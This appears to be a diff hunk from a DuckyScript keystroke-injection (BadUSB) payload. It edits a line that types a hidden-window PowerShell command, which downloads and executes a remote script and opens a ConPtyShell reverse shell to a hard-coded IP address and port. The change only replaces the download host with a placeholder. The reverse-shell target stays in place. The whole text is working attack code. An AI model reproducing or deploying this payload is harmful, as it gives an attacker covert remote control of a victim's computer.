@@ -37,6 +37,6 @@ DELAY 200
 REM Launch Netcat to listener
 GUI R
 DELAY 400
-STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'http://101.99.74.214:81/windows-nc-rs.ps1' -UseBasicParsing).Content; Invoke-ConPtyShell 101.99.74.214 87"
+STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'http://<url / ip address>/windows-nc-rs.ps1' -UseBasicParsing).Content; Invoke-ConPtyShell 101.99.74.214 87"
 DELAY 400
 ENTER
